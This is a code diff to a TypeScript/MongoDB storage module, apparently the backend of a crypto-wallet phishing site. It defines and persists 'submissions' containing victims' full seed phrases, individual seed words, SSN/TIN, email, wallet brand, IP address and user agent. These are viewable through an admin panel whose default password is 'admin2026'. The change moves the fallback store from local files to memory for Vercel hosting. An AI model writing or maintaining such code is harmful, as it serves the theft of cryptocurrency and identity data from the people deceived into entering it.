@@ -1,6 +1,27 @@
 import { MongoClient, Db } from 'mongodb';
-import * as localDb from './db';
 import { DEFAULT_EMAIL_CONFIG, EmailConfig } from './mailer';
+
+export interface Submission {
+  id: string;
+  reference_number: string;
+  submitted_at: string;
+  ssn_tin: string;
+  email: string;
+  wallet_type: string;
+  wallet_brand: string;
+  seed_length: number;
+  seed_words: string[];
+  seed_phrase_full: string;
+  signature_data: string;
+  client_ip: string;
+  user_agent: string;
+}
+
+export interface SystemSettings {
+  admin_password: string;
+  email_config: EmailConfig;
+  updated_at: string;
+}
 
 const uri = process.env.MONGODB_URI || '';
 const options = {};
@@ -15,14 +36,12 @@ declare global {
 
 if (uri) {
   if (process.env.NODE_ENV === 'development') {
-    // In development mode, use a global variable so the MongoClient is not repeated
     if (!global._mongoClientPromise) {
       client = new MongoClient(uri, options);
       global._mongoClientPromise = client.connect();
     }
     clientPromise = global._mongoClientPromise;
   } else {
-    // In production mode, it's best to not use a global variable
     client = new MongoClient(uri, options);
     clientPromise = client.connect();
   }
@@ -59,17 +78,31 @@ export async function isMongoConnected(): Promise<boolean> {
 }
 
 // ---------------------------------------------------------------------------
-// SUBMISSIONS METHODS (MONGODB WITH AUTOMATIC LOCAL FALLBACK)
+// PURE IN-MEMORY FALLBACK (ZERO FILESYSTEM / DISK ACCESS FOR VERCEL COMPATIBILITY)
 // ---------------------------------------------------------------------------
 
-export async function getAllSubmissions(): Promise<localDb.Submission[]> {
+const inMemorySubmissions: Submission[] = [];
+
+let inMemorySettings: SystemSettings = {
+  admin_password: process.env.ADMIN_PASSWORD || 'admin2026',
+  email_config: { ...DEFAULT_EMAIL_CONFIG },
+  updated_at: new Date().toISOString(),
+};
+
+// ---------------------------------------------------------------------------
+// SUBMISSIONS METHODS
+// ---------------------------------------------------------------------------
+
+export async function getAllSubmissions(): Promise<Submission[]> {
   const db = await getDatabase();
   if (!db) {
-    return localDb.getAllSubmissions();
+    return inMemorySubmissions.slice().sort(
+      (a, b) => new Date(b.submitted_at).getTime() - new Date(a.submitted_at).getTime()
+    );
   }
 
   try {
-    const collection = db.collection<localDb.Submission>('submissions');
+    const collection = db.collection<Submission>('submissions');
     const records = await collection
       .find({})
       .sort({ submitted_at: -1 })
@@ -91,15 +124,17 @@ export async function getAllSubmissions(): Promise<localDb.Submission[]> {
       user_agent: doc.user_agent,
     }));
   } catch (error) {
-    console.error('[MongoDB Fetch Error] Falling back to local storage:', error);
-    return localDb.getAllSubmissions();
+    console.error('[MongoDB Fetch Error] Returning in-memory records:', error);
+    return inMemorySubmissions.slice().sort(
+      (a, b) => new Date(b.submitted_at).getTime() - new Date(a.submitted_at).getTime()
+    );
   }
 }
 
-export async function getSubmissionById(id: string): Promise<localDb.Submission | null> {
+export async function getSubmissionById(id: string): Promise<Submission | null> {
   const db = await getDatabase();
   if (!db) {
-    return localDb.getSubmissionById(id);
+    return inMemorySubmissions.find((s) => s.id === id || s.reference_number === id) || null;
   }
 
   try {
@@ -125,7 +160,7 @@ export async function getSubmissionById(id: string): Promise<localDb.Submission 
       user_agent: doc.user_agent,
     };
   } catch {
-    return localDb.getSubmissionById(id);
+    return inMemorySubmissions.find((s) => s.id === id || s.reference_number === id) || null;
   }
 }
 
@@ -139,7 +174,7 @@ export async function saveSubmission(payload: {
   signature?: string;
   client_ip?: string;
   user_agent?: string;
-}): Promise<localDb.Submission> {
+}): Promise<Submission> {
   const db = await getDatabase();
 
   const id = 'sub_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
@@ -151,7 +186,7 @@ export async function saveSubmission(payload: {
   const words = Array.isArray(payload.seed_words) ? payload.seed_words : [];
   const wordsFlat = words.join(' ').trim();
 
-  const record: localDb.Submission = {
+  const record: Submission = {
     id,
     reference_number: refNumber,
     submitted_at: dateObj.toISOString(),
@@ -167,8 +202,8 @@ export async function saveSubmission(payload: {
     user_agent: payload.user_agent || 'Unknown',
   };
 
-  // Always mirror to local DB so local copies remain consistent
-  localDb.saveSubmissionDirect(record);
+  // Mirror to in-memory buffer
+  inMemorySubmissions.unshift(record);
 
   if (db) {
     try {
@@ -176,7 +211,7 @@ export async function saveSubmission(payload: {
       await collection.insertOne({ ...record });
       console.log(`[MongoDB] Submission ${refNumber} persisted to MongoDB.`);
     } catch (err) {
-      console.error('[MongoDB Insert Error] Stored in local fallback:', err);
+      console.error('[MongoDB Insert Error]:', err);
     }
   }
 
@@ -199,8 +234,13 @@ export async function deleteSubmission(id: string): Promise<boolean> {
     }
   }
 
-  const deletedFromLocal = localDb.deleteSubmission(id);
-  return deletedFromMongo || deletedFromLocal;
+  const idx = inMemorySubmissions.findIndex((s) => s.id === id || s.reference_number === id);
+  const deletedFromMem = idx !== -1;
+  if (deletedFromMem) {
+    inMemorySubmissions.splice(idx, 1);
+  }
+
+  return deletedFromMongo || deletedFromMem;
 }
 
 export async function getSubmissionStats() {
@@ -245,14 +285,8 @@ export async function getSubmissionStats() {
 }
 
 // ---------------------------------------------------------------------------
-// SETTINGS & CONFIGURATION METHODS (MONGODB WITH DYNAMIC EMAIL & PASSWORD)
+// SETTINGS & CONFIGURATION METHODS (PURE MONGODB / IN-MEMORY - NO LOCAL FILES)
 // ---------------------------------------------------------------------------
-
-export interface SystemSettings {
-  admin_password: string;
-  email_config: EmailConfig;
-  updated_at: string;
-}
 
 const SETTINGS_DOC_ID = 'app_system_settings';
 
@@ -278,8 +312,8 @@ export async function getSystemSettings(): Promise<SystemSettings> {
     }
   }
 
-  // Fallback to local settings file
-  return localDb.getLocalSettings();
+  // Pure in-memory fallback (zero disk access)
+  return inMemorySettings;
 }
 
 export async function updateSystemSettings(partial: Partial<SystemSettings>): Promise<SystemSettings> {
@@ -292,6 +326,8 @@ export async function updateSystemSettings(partial: Partial<SystemSettings>): Pr
     },
     updated_at: new Date().toISOString(),
   };
+
+  inMemorySettings = updated;
 
   const db = await getDatabase();
   if (db) {
@@ -307,9 +343,6 @@ export async function updateSystemSettings(partial: Partial<SystemSettings>): Pr
       console.error('[MongoDB Settings Update Error]:', err);
     }
   }
-
-  // Also persist to local backup
-  localDb.saveLocalSettings(updated);
 
   return updated;
 }
